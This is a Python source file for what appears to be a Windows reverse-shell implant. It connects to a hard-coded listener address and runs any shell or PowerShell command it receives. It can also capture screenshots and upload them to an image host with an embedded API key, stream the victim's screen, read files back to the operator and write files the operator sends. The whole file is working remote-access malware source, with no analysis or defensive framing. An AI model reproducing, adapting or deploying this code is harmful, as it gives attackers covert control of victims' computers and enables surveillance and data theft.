#!/usr/bin/env python3

import os
import socket
import subprocess
import base64
import requests
from PIL import ImageGrab
import sys
import logging
import threading
import cv2
import numpy as np
from flask import Flask, Response
from flask_socketio import SocketIO, emit
import pyautogui
import timeit,time
LHOST = '10.195.100.240' # add ip address listner
LPORT = int(7777) # add port
hostname = socket.gethostname()
IPaddress = socket.gethostbyname(hostname)
Port = int(6655)
Stopthread = 0
class CallMeBack:
    def __init__(self):
        global Stopthread
        self.__Socket_SockClinet()
    def StreamChannel(self):
        global Stopthread
        StimeStart = timeit.default_timer()
        try:
            while True:
                screenshot = pyautogui.screenshot()
                frame = np.array(screenshot)
                frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
                screen = frame
                ret, buffer = cv2.imencode('.jpg', screen)
                frame = buffer.tobytes()
                StimeConut = timeit.default_timer()
                sec = StimeConut -  StimeStart
                fix_time = time.gmtime(sec)
                StreamTime = str(time.strftime("%H:%M:%S",fix_time)).split(':')
                if StreamTime[2] == '30':
                    break
                self.SendBack.sendall((str(len(frame))).encode().ljust(16) + frame)
        finally:
            pass       
    def __Socket_SockClinet(self,LHOST=LHOST,LPORT=LPORT):
       
        global Stopthread       
        SendBack=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.SendBack = SendBack
        SendBack.connect((LHOST,LPORT))
        path = os.getcwd()+ ' > '
        SendBack.sendall(bytes(path.encode()))     
        while True :
            data = SendBack.recv(4096).decode('latin-1')
            if not data:
                SendBack.cloes()
            try:
                if 'powershell' in data:
                    Data = subprocess.run(["powershell.exe",data.split()[1] ], shell=True, capture_output=True)
                else:
                    Data = subprocess.run(data,shell=True,capture_output=True)
                
                if 'The system cannot find the path specified' in str(Data):
                    HandelPath = str("".join(data.split()[1:])) +' The system cannot find the path specified.'.replace('\n','')
                    SendBack.sendall(bytes(path.encode())), SendBack.sendall(HandelPath.encode()+'\n'.encode('latin-1'))
                    SendBack.sendall(bytes(path.encode()))
                else:                     
                    path = os.getcwd()+ ' > '  
                if 'quit' in data:
                    SendBack.close()
                elif 'cd' in data:
                   try:
                        os.chdir(str(" ".join(data.split()[1:])))
                        path = os.getcwd()+ ' > '
                        SendBack.sendall(bytes(path.encode()))
                   except Exception:
                         SendBack.sendall(bytes(path.encode()))
                         continue
                elif 'screenshot' in data :
                    snapshot = ImageGrab.grab() 
                    file =os.environ["appdata"]+'\\'+"IMage.jpg"
                    snapshot.save(file)
                    with open(os.environ["appdata"]+'\\'+"IMage.jpg", "rb") as file:
                        url = "https://api.imgbb.com/1/upload"
                        payload = {
                            "expiration": "600",
                            "key":"b205eda46389c875c103903a9adb1b3f",
                            "image": base64.b64encode(file.read()),
                        }
                        res = requests.post(url, payload)
                        respones =res.text.split('url')
                        respones = respones[2].split(',')[0].replace('"','').replace(':','',1).replace('\\','')+'\n'   
                        SendBack.sendall(bytes(path.encode())), SendBack.sendall(bytes(respones.encode()))
                        SendBack.sendall(bytes(path.encode()))          
                elif 'stream' in data:
                    thread = threading.Thread(target=self.StreamChannel)                  
                    thread.start()              
                    continue
                elif 'gitfile' in data :
                    data = data.split()
                    try:
                        with open(str("".join(data[-1])),'rb') as FileData:
                            FileData = FileData.read()     
                            SendBack.send(len(FileData).to_bytes(4, byteorder='big'))
                            SendBack.sendall(FileData)
                            SendBack.sendall(bytes(path.encode()))
                    except FileNotFoundError:
                           pass
                elif 'loadfile' in data.split()[0] :
                    LenDataFile = SendBack .recv(4)
                    LenDataFile = int.from_bytes(LenDataFile, byteorder='big')
                    FileDataGet = b''
                    while len(FileDataGet) < LenDataFile:
                        BytesBlock = SendBack.recv(LenDataFile - len(FileDataGet))
                        if not BytesBlock:
                            break
                        FileDataGet += BytesBlock
                    with open(data.split()[-1], 'wb') as file:
                        file.write(FileDataGet)
                    SendBack.sendall(bytes(path.encode()))
                elif 'returncode=1' in str(Data) :
                       Except = str(data) +' not recognized as an internal or external command'.replace('\n','')
                       SendBack.sendall(bytes(path.encode())), SendBack.sendall(Except.encode()+'\n'.encode('latin-1'))
                       SendBack.sendall(bytes(path.encode())) 
              
                else:
                     Data =bytes(Data.stdout.decode('latin-1').encode())
                     SendBack.sendall(Data)
                     SendBack.sendall(bytes(path.encode()))
                        
            except Exception :
               continue 
        

if __name__=='__main__':
     CallMeBack()
